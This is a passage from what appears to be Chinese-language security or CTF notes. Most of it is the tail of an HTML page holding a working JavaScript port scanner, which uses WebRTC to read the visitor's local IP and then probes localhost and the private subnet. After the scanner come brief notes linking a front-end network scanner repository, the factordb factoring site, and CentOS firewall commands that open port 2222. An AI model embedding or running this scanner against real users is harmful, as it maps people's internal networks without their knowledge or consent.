        pc.onicecandidate = function(ice){
            if(ice.candidate)
                handleCandidate(ice.candidate.candidate);
        };
        pc.createDataChannel("");
        pc.createOffer(function(result){
            pc.setLocalDescription(result, function(){}, function(){});

        }, function(){});
        setTimeout(function(){
            var lines = pc.localDescription.sdp.split('\n');
            lines.forEach(function(line){
                if(line.indexOf('a=candidate:') === 0)
                    handleCandidate(line);
            });
        }, 1000);
    });
    return promise;
  }
}
(async () =>{
  var scan = new PortScanner(), ip, ips, i;
  try {
    ip = await scan.getLocalIPs();
    if (ip.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/)) {
      scan.setUrl('http://127.0.0.1');
      await scan.scanArray(scan.getCommonPorts());
      ips = scan.getIPRange(ip);
      for(i=0;i<ips.length;i++) {
        scan.setUrl('http://'+ips[i]);
        if(scan.browser === 'Firefox') {
          await scan.scanArray(scan.getCommonHttpPorts());
        } else {
          await scan.scanPort(80);
        }
      }
      scan.setUrl('http://'+ip);
      await scan.scanArray(scan.getCommonPorts());
      for(i=0;i<ips.length;i++) {
        if(ip === ips[i]) {
          continue;
        }
        scan.setUrl('http://'+ips[i]);
        await scan.scanArray(scan.getCommonPorts());
      }
    } else {
      scan.setUrl('http://127.0.0.1');
      await scan.scanArray(scan.getCommonPorts());
    }
  } catch(e){
    scan.setUrl('http://127.0.0.1');
    await scan.scanArray(scan.getCommonPorts());
  }
  scan.setUrl('http://127.0.0.1');
  for(i=0;i<=0xffff;i+=1000){
    await scan.scanRange(i,i+1000>0xffff?i+(0xffff-i):i+1000);
  }
})();
</script>
</body>
</html>
```

## 前端端口扫描

https://github.com/SkyLined/LocalNetworkScanner.git

## 大素数分解网站

**http://www.factordb.com/index.php?query=542800573380084826910381**

## centos防火墙

`firewall-cmd --permanent --add-port=2222/tcp`

`firewall-cmd --reload`

`firewall-cmd --zone=public --list-ports`

